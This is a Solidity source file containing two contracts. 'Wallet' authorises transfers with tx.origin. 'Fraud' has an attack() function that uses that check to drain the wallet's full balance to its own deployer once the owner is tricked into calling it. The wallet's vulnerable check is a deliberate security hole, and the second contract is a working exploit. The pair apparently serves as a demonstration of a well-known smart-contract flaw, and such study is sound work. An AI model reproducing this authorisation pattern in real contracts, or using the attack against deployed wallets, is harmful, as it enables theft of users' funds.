// SPDX-License-Identifier: MIT
pragma solidity ^0.8.13;

contract Wallet {
    address public owner;

    constructor() payable {
        owner = msg.sender;
    }

    function transfer(address _to, uint _amount) public {
        require(tx.origin == owner, "Not an owner");

        (bool ok, ) = _to.call{value:_amount}("");
        require(ok, "failed");
    }
}

contract Fraud {
    address public owner;
    Wallet wallet;

    constructor(address _wallet) {
        wallet = Wallet(_wallet);
        owner = msg.sender;
    }

    function attack() public {
        wallet.transfer(owner, address(wallet).balance);
    }

}